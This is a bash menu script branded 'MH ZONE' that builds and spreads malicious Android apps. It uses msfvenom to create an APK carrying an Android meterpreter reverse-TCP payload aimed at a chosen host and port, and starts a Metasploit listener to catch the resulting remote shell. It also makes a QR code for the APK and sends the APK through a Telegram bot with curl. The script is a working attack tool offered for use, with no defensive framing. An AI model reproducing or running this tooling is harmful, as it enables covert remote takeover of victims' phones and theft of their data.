#!/bin/bash

# Colors
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
blue='\033[1;34m'
blink='\033[5m'
nc='\033[0m'

# Clear screen
clear

# Header
clear
green='\033[0;32m'
red='\033[0;31m'
blink='\033[5m'
nc='\033[0m' # No Color

echo -e "${green}███╗   ███╗██╗  ██╗     ███████╗ ██████╗ ███╗   ██╗███████╗"
echo -e "${green}████╗ ████║██║  ██║     ██╔════╝██╔═══██╗████╗  ██║██╔════╝"
echo -e "${green}██╔████╔██║███████║     █████╗  ██║   ██║██╔██╗ ██║█████╗"
echo -e "${green}██║╚██╔╝██║██╔══██║     ██╔══╝  ██║   ██║██║╚██╗██║██╔══╝"
echo -e "${green}██║ ╚═╝ ██║██║  ██║     ██║     ╚██████╔╝██║ ╚████║███████╗"
echo -e "${green}╚═╝     ╚═╝╚═╝  ╚═╝     ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚══════╝"
echo -e "${blink}${red}=========================[ MH ZONE ]=========================${nc}"
sleep 1
# Main Menu
while true; do
  echo ""
  echo -e "${green}[1] Create Android Payload"
  echo -e "[2] Start Metasploit Listener"
  echo -e "[3] Generate QR Code (for APK)"
  echo -e "[4] Send APK via Telegram Bot"
  echo -e "[5] Exit${nc}"
  echo ""
  read -p "Select Option [1-5]: " opt

  case $opt in

    1)
      read -p "Enter LHOST (Your IP): " lhost
      read -p "Enter LPORT (Port): " lport
      read -p "Enter App Name (e.g. haroon): " appname
      outpath="/storage/emulated/0/${appname}.apk"
      echo -e "${yellow}[+] Creating Payload...${nc}"
      msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $outpath
      echo -e "${green}[✓] Payload saved at: $outpath${nc}"
      ;;

    2)
      read -p "Enter LHOST (Same as Payload): " lhost
      read -p "Enter LPORT (Same as Payload): " lport
      echo -e "${yellow}[+] Starting Listener...${nc}"
      msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit"
      ;;

    3)
      read -p "Enter APK Name (without .apk): " appname
      apk_path="/storage/emulated/0/${appname}.apk"
      if [ -f "$apk_path" ]; then
        echo -e "${yellow}[+] Generating QR Code...${nc}"
        qrencode -o "/storage/emulated/0/${appname}.png" "file://$apk_path"
        echo -e "${green}[✓] QR Code saved at: /storage/emulated/0/${appname}.png${nc}"
      else
        echo -e "${red}[!] APK not found. Create it first.${nc}"
      fi
      ;;

    4)
      read -p "Enter APK Name to Send (without .apk): " appname
      read -p "Enter Telegram Bot Token: " bottoken
      read -p "Enter Telegram Chat ID: " chatid
      apk_path="/storage/emulated/0/${appname}.apk"
      if [ -f "$apk_path" ]; then
        echo -e "${yellow}[+] Sending APK via Telegram...${nc}"
        curl -F document=@"$apk_path" "https://api.telegram.org/bot$bottoken/sendDocument?chat_id=$chatid"
        echo -e "${green}[✓] APK sent successfully!${nc}"
      else
        echo -e "${red}[!] APK not found. Create it first.${nc}"
      fi
      ;;

    5)
      echo -e "${blue}Exiting MH ZONE...${nc}"
      exit
      ;;

    *)
      echo -e "${red}[!] Invalid Option. Try again.${nc}"
      ;;

  esac
done
